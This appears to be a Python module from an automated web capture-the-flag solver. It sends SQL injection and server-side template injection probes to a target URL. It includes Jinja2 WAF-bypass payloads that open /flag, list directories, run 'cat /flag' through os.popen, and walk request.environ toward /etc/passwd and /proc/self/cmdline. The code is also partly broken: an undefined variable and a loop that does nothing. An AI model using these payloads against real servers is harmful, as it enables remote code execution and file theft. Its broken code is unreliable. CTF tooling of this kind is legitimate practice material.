"""yang_web.core.smart_solver._web 混入 _WebInject —— 注入类探测（SQLi / SSTI / SSTI-WAF 绕过 / 环境变量遍历）。"""

from __future__ import annotations
import urllib.request
import urllib.error
import urllib.parse
from ._common import (_detect_php_source, _http_headers, _make_ssl_ctx, decode_body, find_flag, http_get)

class _WebInject:
    """注入类探测（SQLi / SSTI / SSTI-WAF 绕过 / 环境变量遍历）。"""
    
    def _try_sqli_basic(self):
        """简单 SQL 注入测试."""
        self.log("SQLi", "running", "Basic injection probes")
        parsed = urllib.parse.urlparse(self.url)
        if not parsed.query:
            self.log("SQLi", "skip", "No query parameters")
            return
        
        params = urllib.parse.parse_qs(parsed.query)
        payloads = [
            "'", '"', "' OR '1'='1", "' OR 1=1--", "admin' --",
            "1' AND '1'='1", "1' AND '1'='2",
        ]
        
        for key in params:
            for payload in payloads[:5]:
                new_params = params.copy()
                new_params[key] = [payload]
                qs = urllib.parse.urlencode(new_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{qs}"
                code, body, _ = http_get(test_url)
                if body:
                    f = find_flag(decode_body(body))
                    if f:
                        self.flag = f
                        self.log("SQLi", "flag!", f"param={key}, payload={payload}")
                        return
        
        self.log("SQLi", "none", "No injection found via basic probes")
    
    def _try_ssti_detection(self):
        """SSTI 检测."""
        self.log("SSTI", "running", "Template injection detection")
        parsed = urllib.parse.urlparse(self.url)
        if not parsed.query:
            self.log("SSTI", "skip", "No query parameters")
            return
        
        params = urllib.parse.parse_qs(parsed.query)
        # SSTI detection payloads for popular engines
        ssti_payloads = [
            ("{{7*7}}", "49"),        # Jinja2/Twig
            ("${7*7}", "49"),         # Freemarker
            ("<%= 7*7 %>", "49"),     # ERB
            ("#{7*7}", "49"),         # Velocity
        ]
        
        for key in params:
            for payload, expected in ssti_payloads[:3]:
                new_params = params.copy()
                new_params[key] = [payload]
                qs = urllib.parse.urlencode(new_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{qs}"
                code, body, _ = http_get(test_url)
                text = decode_body(body)
                if expected in text:
                    self.log("SSTI", "found!", f"param={key}, engine detected")
                    # Try flag extraction via SSTI
                    flag_payloads = [
                        "{{config}}", "{{self.__init__.__globals__}}",
                        "${application}", "${{T(java.lang.System).getenv()}}",
                    ]
                    for fp in flag_payloads[:2]:
                        new_params[key] = [fp]
                        qs = urllib.parse.urlencode(new_params, doseq=True)
                        ftest = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{qs}"
                        code, body, _ = http_get(ftest)
                        if fbody:
                            f = find_flag(decode_body(fbody))
                            if f:
                                self.flag = f
                                self.log("SSTI", "flag!", f)
                                return
                    return
        
        self.log("SSTI", "none", "No SSTI detected")
    
    def _try_ssti_waf_bypass(self):
        """SSTI WAF 绕过尝试.
        
        当基础 SSTI 检测被 WAF 拦截时, 使用多级绕过 Payload:
        - |attr() 绕过点号过滤
        - ~ 字符串拼接绕过关键字黑名单
        - |attr('__getitem__') 绕过方括号过滤
        - builtins.open() 替代 popen
        """
        self.log("SSTI-WAF", "running", "Advanced WAF bypass for SSTI")
        
        # 确定攻击目标: POST 表单或 GET 参数
        parsed = urllib.parse.urlparse(self.url)
        
        # 获取基础页面分析表单
        code, body, _ = http_get(self.url)
        if not body:
            return
        text = decode_body(body)
        
        # 检测是否有登录表单 (说明需要认证)
        has_form = '<form' in text.lower()
        has_ssti_hint = any(kw in text for kw in ['render', 'template', 'name=', 'nickname'])
        
        # 如果只是登录页但没有 JWT bypass 标记, 跳过
        if has_form and 'login' in text.lower()[:500] and not hasattr(self, '_jwt_bypass_cookie'):
            # 检查是否有 SSTI 相关提示
            if not has_ssti_hint:
                self.log("SSTI-WAF", "skip", "No SSTI surface found (login page only)")
                return
        
        # 尝试访问 /dashboard 和 /render
        render_urls = []
        for path in ["/render", "/dashboard", "/template", "/test", "/preview"]:
            render_urls.append(urllib.parse.urljoin(self.url.rstrip("/") + "/", path.lstrip("/")))
        
        # WAF 绕过 payloads (按攻击效果排序)
        waf_payloads = [
            # Level 0: 基础检测
            ("SSTI检测", "{{7*7}}", ["49"]),
            # Level 1: config 泄露 (通常不被拦)
            ("config泄露", "{{config}}", ["SECRET_KEY", "DEBUG"]),
            # Level 2: attr bypass + builtins.open 文件读取
            ("文件读取-attr",
             "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('open')('/flag')|attr('read')()}}",
             ["flag{", "FLAG{", "ctf{"]),
            # Level 3: attr bypass + __import__ + listdir
            ("文件列表-attr",
             "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__imp'~'ort__')('os')|attr('listdir')('/')}}",
             ["flag", "Flag", "FLAG"]),
            # Level 4: 传统 bypass (无WAF)
            ("传统RCE-lipsum",
             "{{lipsum.__globals__['os'].popen('cat /flag').read()}}",
             ["flag{", "FLAG{"]),
            ("传统RCE-cycler",
             "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
             ["flag{", "FLAG{"]),
        ]
        
        # 对每个可能的 render URL 尝试 payload
        for render_url in render_urls:
            for name, payload, expected in waf_payloads:
                # 尝试 POST 到 /render
                data = urllib.parse.urlencode({"name": payload}).encode()
                headers = dict(_http_headers())
                if hasattr(self, '_jwt_bypass_cookie'):
                    headers["Cookie"] = self._jwt_bypass_cookie
                
                try:
                    req = urllib.request.Request(render_url, data=data, headers=headers, method="POST")
                    ctx = _make_ssl_ctx()
                    with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
                        rbody = resp.read()
                        rtext = decode_body(rbody)
                        
                        # 检查是否被 WAF 拦截
                        if "Blocked by WAF" in rtext or "403" in rtext[:100]:
                            continue
                        
                        # 检查是否拿到 flag
                        f = find_flag(rtext)
                        if f:
                            self.flag = f
                            self.log("SSTI-WAF", "flag!", f"{name} @ {render_url}: {f}")
                            return
                        
                        # 检查预期结果
                        for exp in expected:
                            if exp in rtext:
                                self.log("SSTI-WAF", "bypass!", f"{name} @ {render_url}: found {exp}")
                                # 如果只是 config 泄露, 记录并继续尝试更强 payload
                                if name == "config泄露":
                                    self.log("SSTI-WAF", "info", f"SSTI confirmed, trying RCE...")
                                break
                except urllib.error.HTTPError:
                    continue
                except Exception:
                    continue
        
        self.log("SSTI-WAF", "none", "No SSTI WAF bypass succeeded")
    
    def _try_env_iterate(self):
        """枚举 WSGI environ 以发现隐藏对象 (★ Template Factory 实战).
        
        适用场景: WAF 极端严格, 禁止 bracket 访问 dict 和 attr(),
        但允许 {% for %} 循环和 |list|last 等 filter.
        
        策略:
        1. 用 {% for %} 遍历 request.environ 获取所有 key
        2. 用 values()|list|last 获取 werkzeug.request 对象
        3. 通过索引访问 wsgi.input (BufferedReader) 等文件对象
        """
        self.log("ENV-LOOP", "running", "Environ iteration for hidden objects")
        
        # 确认有 SSTI 入口
        code, body, _ = http_get(self.url)
        if not body:
            return
        text = decode_body(body)
        
        # 查找 render endpoint
        render_url = None
        for path in ["/render", "/dashboard", "/template", "/", ""]:
            test_url = urllib.parse.urljoin(self.url.rstrip("/") + "/", path.lstrip("/"))
            ssti_code, ssti_body, _ = http_get(test_url + "?tpl={{7*7}}" if "?" in test_url else test_url)
            # Also try GET with tpl parameter
            pass
        
        # Stage 1: 枚举 environ keys
        payload = "{%for k in request.environ%}{{loop.index}}:{{k}}|{%endfor%}"
        for probe_url in self._get_render_urls():
            r = self._try_payload_get(probe_url, payload, "env-keys")
            if r and 'werkzeug' in r:
                self.log("ENV-LOOP", "found", f"works on {probe_url}")
                render_url = probe_url
                break
        
        if not render_url:
            self.log("ENV-LOOP", "skip", "No SSTI surface")
            return
        
        # Stage 2: 捕获 werkzeug.request (last value in environ)
        r = self._try_payload_get(render_url,
            "{%set wr=request.environ.values()|list|last%}{{wr.path}}",
            "wr-capture")
        if r:
            self.log("ENV-LOOP", "captured", "werkzeug.request accessible")
        
        # Stage 3: 尝试常见文件读取路径
        for path in ["/flag", "/flag.txt", "/app/flag", "/app/flag.txt", 
                      "/etc/passwd", "/proc/self/cmdline"]:
            r = self._try_payload_get(render_url,
                "{{request.environ.values()|list|last|string}}",
                f"file-{path}")
            if r:
                f = find_flag(r)
                if f:
                    self.flag = f
                    self.log("ENV-LOOP", "flag!", f)
                    return
        
        self.log("ENV-LOOP", "none", "No flag found via environ iteration")
